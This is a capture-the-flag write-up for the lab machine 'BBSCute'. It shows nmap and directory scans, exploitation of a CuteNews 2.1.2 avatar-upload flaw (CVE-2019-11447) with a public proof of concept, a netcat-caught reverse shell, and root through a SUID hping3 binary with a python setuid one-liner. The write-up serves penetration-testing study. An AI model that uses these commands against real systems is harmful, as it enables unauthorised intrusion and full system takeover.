---
render_with_liquid: false
title: PG Play  BBSCute
date: 2024-06-11 14:01:36 +1400
tags: [pg-play, nmap, linux, feroxbuster, php, cutenews, cve-2019-11447, file-upload, suid, gtfobin]
---



# Learnt / Summary

- 

# Recon


## Nmap

```bash

# Nmap 7.94SVN scan initiated Tue Jun 11 14:01:36 2024 as: nmap -sVC --version-all -T4 -Pn -vv -oA ./nmap/full_tcp_scan -p 22,80,88,110,995, 192.168.239.128
Warning: Hit PCRE_ERROR_MATCHLIMIT when probing for service http with the regex '^HTTP/1\.1 \d\d\d (?:[^\r\n]*\r\n(?!\r\n))*?.*\r\nServer: Virata-EmWeb/R([\d_]+)\r\nContent-Type: text/html; ?charset=UTF-8\r\nExpires: .*<title>HP (Color |)LaserJet ([\w._ -]+)&nbsp;&nbsp;&nbsp;'
Nmap scan report for 192.168.239.128
Host is up, received user-set (0.063s latency).
Scanned at 2024-06-11 14:01:36 CST for 31s

PORT    STATE SERVICE  REASON         VERSION
22/tcp  open  ssh      syn-ack ttl 61 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 04:d0:6e:c4:ba:4a:31:5a:6f:b3:ee:b8:1b:ed:5a:b7 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDfExBygmjGp3e7nXpwC4vVz4LWCyYHz0L7j/LG/9jppdNt9Mu+zgnzKeiXSl7MUUNHxX2diHm7cdwzjRZATsPHs/x8QXhkwLpcJNvKAKl4dg+HFJIJaQH1yyzdY93yoiRrjqG37VJ4FCh68d8ouC4UGtsf9jjzxA3LwPpn7q8Tw/uqN/8+CMdmTyqa07Z2mVdmkzyokknCX40ZCBCUNPgQYTQYLW3GAmJMuHcE5d7SSyogWeqPbkM7Mub3x5rwYL1Wf+9Y8I5SbmMcFRHOSGroKHYcvbvt8A/VUqw44XtzvPdllhfFbwWpj1xwcNILi1WgWoBw3ymD14PFZUWXUZbR
|   256 24:b3:df:01:0b:ca:c2:ab:2e:e9:49:b0:58:08:6a:fa (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBiSQebU59RFA2H+6WZcwxmwTS9j3i3ttgEcwQi8oJoo7UNtulXExHcLQt2AXsZuRk6WilnLEoKyZxwC5DWsikE=
|   256 6a:c4:35:6a:7a:1e:7e:51:85:5b:81:5c:7c:74:49:84 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIF6g+3N64VFhd+Aw/pbyZ7+qU1m+PoxIE9Rmeo61lXIe
80/tcp  open  http     syn-ack ttl 61 Apache httpd 2.4.38 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-favicon: Unknown favicon MD5: 759585A56089DB516D1FBBBE5A8EEA57
|_http-server-header: Apache/2.4.38 (Debian)
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
88/tcp  open  http     syn-ack ttl 61 nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: 404 Not Found
110/tcp open  pop3     syn-ack ttl 61 Courier pop3d
|_ssl-date: TLS randomness does not represent time
|_pop3-capabilities: TOP IMPLEMENTATION(Courier Mail Server) UTF8(USER) PIPELINING UIDL USER LOGIN-DELAY(10) STLS
| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US/organizationalUnitName=Automatically-generated POP3 SSL key/localityName=New York
| Subject Alternative Name: email:postmaster@example.com
| Issuer: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US/organizationalUnitName=Automatically-generated POP3 SSL key/localityName=New York
| Public Key type: rsa
| Public Key bits: 3072
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-09-17T16:28:06
| Not valid after:  2021-09-17T16:28:06
| MD5:   5ee2:40c8:66d1:b327:71e6:085a:f50b:7e28
| SHA-1: 28a3:acc0:86a7:cd64:8f09:78fa:1792:7032:0ecc:b154
| -----BEGIN CERTIFICATE-----
| MIIE6zCCA1OgAwIBAgIBATANBgkqhkiG9w0BAQsFADCBjjESMBAGA1UEAxMJbG9j
| YWxob3N0MS0wKwYDVQQLEyRBdXRvbWF0aWNhbGx5LWdlbmVyYXRlZCBQT1AzIFNT
| TCBrZXkxHDAaBgNVBAoTE0NvdXJpZXIgTWFpbCBTZXJ2ZXIxETAPBgNVBAcTCE5l
| dyBZb3JrMQswCQYDVQQIEwJOWTELMAkGA1UEBhMCVVMwHhcNMjAwOTE3MTYyODA2
| WhcNMjEwOTE3MTYyODA2WjCBjjESMBAGA1UEAxMJbG9jYWxob3N0MS0wKwYDVQQL
| EyRBdXRvbWF0aWNhbGx5LWdlbmVyYXRlZCBQT1AzIFNTTCBrZXkxHDAaBgNVBAoT
| E0NvdXJpZXIgTWFpbCBTZXJ2ZXIxETAPBgNVBAcTCE5ldyBZb3JrMQswCQYDVQQI
| EwJOWTELMAkGA1UEBhMCVVMwggGiMA0GCSqGSIb3DQEBAQUAA4IBjwAwggGKAoIB
| gQDIBsPdZDb45UVqWpRZiqVqbC1vCd4mXw2Qif5BWHME351unfanqY3pywEGOPha
| J7HuyhLzSF2dWmF3z8I+g4C5q4xO3MglQ2CHfJyAxvfk+pD7omcaFi3N7j5JnPsJ
| enmVWNalaI6bCPGcf1P5ymeHLK61FqL+/Rlaw2x2rsbA+XxNXPdrqOFA4XinNb09
| EiO/qSCmL1r9Q9bTrMkByecJ7iEUK5EwQBDUCoUywnJ+Pu0gExw3mdscKSb3oNw8
| IBZhY6jXGMqjrBQ4pwqWWV9/ljEXEQj6gEqSjweOyYoA3OuB9+5ppTBRzpB22bMq
| kvHnCO0u9h6tSjwZ7+vxynuaVKuyxcfMLl4bO7EYy/dZjJ2fWHZtGkGm4q/HZ97r
| M8gYeEoEr5s5jNmRVrxejO/9w5zNsrZCPt///bFF+h1TWvV1IaCchuxE32srOQfl
| UUgJ4XhgcqD6DaG5nqtJ7LrpN0TcvP373c6J8CJ2b/JSuyHP04TvAEEJYj+vMnVG
| ZsUCAwEAAaNSMFAwDAYDVR0TAQH/BAIwADAhBgNVHREEGjAYgRZwb3N0bWFzdGVy
| QGV4YW1wbGUuY29tMB0GA1UdDgQWBBTFu1JxVBbqWHll0UH7hPEBv+KFizANBgkq
| hkiG9w0BAQsFAAOCAYEADawbz6QNBk3+miizqqXooRU2wZcx+Du6iM92rKLNZCq+
| wEXZEdxGi/WSOY7UxrJbP6dfxvyIpmwsZjFOqNr3w3l0Y/Nwdw23o6gxOlkDFt9p
| dTopD2CYEwmIiRgT60ulZ+gIcHeJu4ExVQ8PDxRnWPEECodQHWrPBVyRa585FQB0
| YpUMjahA98qcvWCaNAI824uDZ9frptM4syzTKFjl/CYuhXGdNDTbq1fjaOJ1MXvh
| qCzKG3A4JLf3R448QtcB5n8LhgwO7w6y7XjBAPYmOcEiuBhRTzy2dzKHLhxXFaHI
| J9A8csWHebvYr80Th7ELpkNgXCnu3mbr2DkWk7hbYSTfcmgi+ISkd892MOllLiu/
| 3dWqund8Bg2gOExQbdeyOMg4+WeQedUQ4sWjI8s7QL9o6H9kwRVsabkYGxfl56Zz
| xrI2K3odZgnCnFCzlu/2cbuzNfF7DvvKHs057F3PzIVxSPuoTcgLNllr4tJqABjY
| JpyNakJF76tDW03eEoAT
|_-----END CERTIFICATE-----
995/tcp open  ssl/pop3 syn-ack ttl 61 Courier pop3d
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US/organizationalUnitName=Automatically-generated POP3 SSL key/localityName=New York
| Subject Alternative Name: email:postmaster@example.com
| Issuer: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US/organizationalUnitName=Automatically-generated POP3 SSL key/localityName=New York
| Public Key type: rsa
| Public Key bits: 3072
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-09-17T16:28:06
| Not valid after:  2021-09-17T16:28:06
| MD5:   5ee2:40c8:66d1:b327:71e6:085a:f50b:7e28
| SHA-1: 28a3:acc0:86a7:cd64:8f09:78fa:1792:7032:0ecc:b154
| -----BEGIN CERTIFICATE-----
| MIIE6zCCA1OgAwIBAgIBATANBgkqhkiG9w0BAQsFADCBjjESMBAGA1UEAxMJbG9j
| YWxob3N0MS0wKwYDVQQLEyRBdXRvbWF0aWNhbGx5LWdlbmVyYXRlZCBQT1AzIFNT
| TCBrZXkxHDAaBgNVBAoTE0NvdXJpZXIgTWFpbCBTZXJ2ZXIxETAPBgNVBAcTCE5l
| dyBZb3JrMQswCQYDVQQIEwJOWTELMAkGA1UEBhMCVVMwHhcNMjAwOTE3MTYyODA2
| WhcNMjEwOTE3MTYyODA2WjCBjjESMBAGA1UEAxMJbG9jYWxob3N0MS0wKwYDVQQL
| EyRBdXRvbWF0aWNhbGx5LWdlbmVyYXRlZCBQT1AzIFNTTCBrZXkxHDAaBgNVBAoT
| E0NvdXJpZXIgTWFpbCBTZXJ2ZXIxETAPBgNVBAcTCE5ldyBZb3JrMQswCQYDVQQI
| EwJOWTELMAkGA1UEBhMCVVMwggGiMA0GCSqGSIb3DQEBAQUAA4IBjwAwggGKAoIB
| gQDIBsPdZDb45UVqWpRZiqVqbC1vCd4mXw2Qif5BWHME351unfanqY3pywEGOPha
| J7HuyhLzSF2dWmF3z8I+g4C5q4xO3MglQ2CHfJyAxvfk+pD7omcaFi3N7j5JnPsJ
| enmVWNalaI6bCPGcf1P5ymeHLK61FqL+/Rlaw2x2rsbA+XxNXPdrqOFA4XinNb09
| EiO/qSCmL1r9Q9bTrMkByecJ7iEUK5EwQBDUCoUywnJ+Pu0gExw3mdscKSb3oNw8
| IBZhY6jXGMqjrBQ4pwqWWV9/ljEXEQj6gEqSjweOyYoA3OuB9+5ppTBRzpB22bMq
| kvHnCO0u9h6tSjwZ7+vxynuaVKuyxcfMLl4bO7EYy/dZjJ2fWHZtGkGm4q/HZ97r
| M8gYeEoEr5s5jNmRVrxejO/9w5zNsrZCPt///bFF+h1TWvV1IaCchuxE32srOQfl
| UUgJ4XhgcqD6DaG5nqtJ7LrpN0TcvP373c6J8CJ2b/JSuyHP04TvAEEJYj+vMnVG
| ZsUCAwEAAaNSMFAwDAYDVR0TAQH/BAIwADAhBgNVHREEGjAYgRZwb3N0bWFzdGVy
| QGV4YW1wbGUuY29tMB0GA1UdDgQWBBTFu1JxVBbqWHll0UH7hPEBv+KFizANBgkq
| hkiG9w0BAQsFAAOCAYEADawbz6QNBk3+miizqqXooRU2wZcx+Du6iM92rKLNZCq+
| wEXZEdxGi/WSOY7UxrJbP6dfxvyIpmwsZjFOqNr3w3l0Y/Nwdw23o6gxOlkDFt9p
| dTopD2CYEwmIiRgT60ulZ+gIcHeJu4ExVQ8PDxRnWPEECodQHWrPBVyRa585FQB0
| YpUMjahA98qcvWCaNAI824uDZ9frptM4syzTKFjl/CYuhXGdNDTbq1fjaOJ1MXvh
| qCzKG3A4JLf3R448QtcB5n8LhgwO7w6y7XjBAPYmOcEiuBhRTzy2dzKHLhxXFaHI
| J9A8csWHebvYr80Th7ELpkNgXCnu3mbr2DkWk7hbYSTfcmgi+ISkd892MOllLiu/
| 3dWqund8Bg2gOExQbdeyOMg4+WeQedUQ4sWjI8s7QL9o6H9kwRVsabkYGxfl56Zz
| xrI2K3odZgnCnFCzlu/2cbuzNfF7DvvKHs057F3PzIVxSPuoTcgLNllr4tJqABjY
| JpyNakJF76tDW03eEoAT
|_-----END CERTIFICATE-----
|_pop3-capabilities: TOP IMPLEMENTATION(Courier Mail Server) UTF8(USER) UIDL LOGIN-DELAY(10) USER PIPELINING
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

# Nmap done at Tue Jun 11 14:02:07 2024 -- 1 IP address (1 host up) scanned in 31.14 seconds
```

## 80 - HTTP : Apache Default Page


### Info

```ruby
http://192.168.239.128 [200] [Apache2 Debian Default Page: It works] [Apache/2.4.38 (Debian)] [d23f3a5389aee902652b149cbe2474a12c57fa5a] [Apache HTTP Server:2.4.38,Debian]
```

![](/assets/obsidian/45386318dc0c475f51bb161b0a6a1a1c.png)

### Directory

```bash
feroxbuster -w /usr/share/seclists/Fuzzing/fuzz-Bo0oM.txt --dont-scan "/server-status/" -k -t 100 -u "http://$(pt get rhost):80" -o ferox_80_fuzz.txt -n
```

```bash
┌──(bravosec㉿fsociety)-[~/Offsec/pg/play/BBSCute]
└─$ cat ferox_80_fuzz.txt | grep -vE '^5|^404' | ff
200      GET        0l        0w        0c http://192.168.239.128/docs/
200      GET        0l        0w        0c http://192.168.239.128/uploads/
200      GET       11l     1762w   125678c http://192.168.239.128/libs/css/cosmo.min.css
200      GET      152l      533w     5555c http://192.168.239.128/libs/codemirror/mode/htmlmixed/htmlmixed.js
200      GET      155l      752w     9522c http://192.168.239.128/example.php
200      GET      168l      396w     6175c http://192.168.239.128/index.php
200      GET        1l       12w     1311c http://192.168.239.128/skins/images/favicon.ico
200      GET        1l      200w    12505c http://192.168.239.128/libs/sweet-alert2/sweet-alert2.min.js
200      GET      226l      901w     9314c http://192.168.239.128/skins/custom.css
200      GET       24l      126w    10356c http://192.168.239.128/icons/openlogo-75.png
200      GET      304l     1682w    10385c http://192.168.239.128/skins/cute.js
200      GET      335l      940w     8045c http://192.168.239.128/libs/codemirror/lib/codemirror.css
200      GET      350l     1110w    13793c http://192.168.239.128/libs/codemirror/mode/vbscript/vbscript.js
200      GET      368l      933w    10701c http://192.168.239.128/
200      GET      368l      933w    10701c http://192.168.239.128/index.html
200      GET      394l     1337w    12570c http://192.168.239.128/libs/codemirror/mode/xml/xml.js
200      GET        4l       63w    27466c http://192.168.239.128/libs/css/font-awesome.min.css
200      GET      516l     1233w    12945c http://192.168.239.128/libs/sweet-alert2/sweet-alert2.css
200      GET       63l      481w     3119c http://192.168.239.128/LICENSE.txt
200      GET        6l      124w     6295c http://192.168.239.128/libs/bootstrap-select/css/bootstrap-select.min.css
200      GET        6l      271w     9972c http://192.168.239.128/libs/bootbox/bootbox.min.js
200      GET      742l     3218w    28078c http://192.168.239.128/libs/codemirror/mode/javascript/javascript.js
200      GET       79l      375w     2523c http://192.168.239.128/README.md
200      GET        7l      435w    36868c http://192.168.239.128/libs/js/bootstrap.min.js
200      GET      825l     3139w    37156c http://192.168.239.128/libs/codemirror/mode/css/css.js
200      GET     8892l    41320w   353358c http://192.168.239.128/libs/codemirror/lib/codemirror.js
200      GET     9831l    39935w   258549c http://192.168.239.128/libs/js/jquery.js
200      GET       98l      319w     3292c http://192.168.239.128/libs/codemirror/addon/selection/selection-pointer.js
200      GET        9l     1437w   121295c http://192.168.239.128/libs/css/default.min.css
200      GET        9l      343w    32759c http://192.168.239.128/libs/bootstrap-select/js/bootstrap-select.min.js
301      GET        9l       28w      317c http://192.168.239.128/docs => http://192.168.239.128/docs/
```

# Initial Access


## Shell as www-data


### 80 - CuteNews 2.1.2 : File upload to RCE (Authenticated) (CVE-2019-11447)

> http://192.168.239.128/index.php

- Version : `CuteNews 2.1.2`

![](/assets/obsidian/2c71c2990db5cae01e5ad7d7fcd651b0.png)

- Google : `CuteNews 2.1.2 exploit`

> POC - https://github.com/ColdFusionX/CVE-2019-11447_CuteNews-AvatarUploadRCE

> **Brief exploit info**
> - `CuteNews 2.1.2` allows php file upload of user avatar
> - The exploit POC will auto register a user if provided credential is not calid
{: .prompt-info }

```bash
cd exploit
git clone https://github.com/ColdFusionX/CVE-2019-11447_CuteNews-AvatarUploadRCE
cd CVE-2019-11447_CuteNews-AvatarUploadRCE
```

```bash
nc -lvnp 1111
```

The uploaded reverse shell that the exploit defined isn't right in this case

```bash
┌──(bravosec㉿fsociety)-[~/…/play/BBSCute/exploit/CVE-2019-11447_CuteNews-AvatarUploadRCE]
└─$ python exploit.py -l http://192.168.239.128/index.php -u admin -p admin -e admin@admin.com
[+] CuteNews 2.1.2 Avatar Upload RCE exploit by ColdFusionX

[+] Credentials admin:admin Successfully Registered
[^] Select your PHP file -> /home/kali/www/rev.php

[*] Adding Magic Byte to PHP file
[+] Upload Successful !!
[*] File location --> http://192.168.239.128/index.php/CuteNews/uploads/avatar_admin_admin.php

[^] Press y/n to trigger PHP file -> y
[*] Check listener for reverse shell
[*] Execution Completed
```

The correct location will be at `/uploads/avatar_admin_admin.php`

```bash
┌──(bravosec㉿fsociety)-[~/…/play/BBSCute/exploit/CVE-2019-11447_CuteNews-AvatarUploadRCE]
└─$ curl http://192.168.239.128/uploads/avatar_admin_admin.php
```

```bash
┌──(bravosec㉿fsociety)-[~/Offsec/pg/play/BBSCute]
└─$ nc -lvnp 1111
listening on [any] 1111 ...
connect to [192.168.45.221] from (UNKNOWN) [192.168.239.128] 42312
SOCKET: Shell has connected! PID: 3053
/usr/bin/script -qc /bin/bash /dev/null
www-data@cute:/var/www/html/uploads$ ^Z
zsh: suspended  nc -lvnp 1111

┌──(bravosec㉿fsociety)-[~/Offsec/pg/play/BBSCute]
└─$ stty raw -echo;fg
stty rows 50 columns 209
[1]  + continued  nc -lvnp 1111
                               export TERM=xterm
www-data@cute:/var/www/html/uploads$ stty rows 50 columns 209
www-data@cute:/var/www/html/uploads$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

# Privilege Escalation


## From www-data to root


### SUID - hping3

```bash
www-data@cute:/var/www/html/uploads$ find / -type f -perm -4000 -exec ls -lahtr {} + 2>/dev/null | awk '$9 !~ /^\/snap\//'
-rwsr-sr-x 1 root root       154K Sep  6  2014 /usr/sbin/hping3
-rwsr-xr-x 1 root root        10K Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root        63K Jul 27  2018 /usr/bin/passwd
-rwsr-xr-x 1 root root        44K Jul 27  2018 /usr/bin/newgrp
-rwsr-xr-x 1 root root        83K Jul 27  2018 /usr/bin/gpasswd
-rwsr-xr-x 1 root root        44K Jul 27  2018 /usr/bin/chsh
-rwsr-xr-x 1 root root        53K Jul 27  2018 /usr/bin/chfn
-rwsr-xr-x 1 root root        35K Jan 10  2019 /usr/bin/umount
-rwsr-xr-x 1 root root        63K Jan 10  2019 /usr/bin/su
-rwsr-xr-x 1 root root        51K Jan 10  2019 /usr/bin/mount
-rwsr-xr-x 1 root root        19K Jan 15  2019 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root root        23K Jan 15  2019 /usr/bin/pkexec
-rwsr-xr-x 1 root root       427K Jan 31  2020 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root       154K Feb  2  2020 /usr/bin/sudo
-rwsr-xr-x 1 root root        35K Apr 22  2020 /usr/bin/fusermount
-rwsr-xr-- 1 root messagebus  50K Jul  5  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

> GTFOBIN - https://gtfobins.github.io/gtfobins/hping3/#suid

```bash
www-data@cute:/var/www/html/uploads$ hping3
hping3> /bin/sh -p

# id
uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)

# $(which python2 python python3 2>/dev/null | head -n1) -c 'import os;os.setuid(0);os.system("/bin/bash -p")'
root@cute:/var/www/html/uploads# id
uid=0(root) gid=33(www-data) groups=33(www-data)
```

# Post Exploitation


## System Proof Screenshot

![](/assets/obsidian/67e56d7132981f15b613c02d533e6749.png)

# Appendix

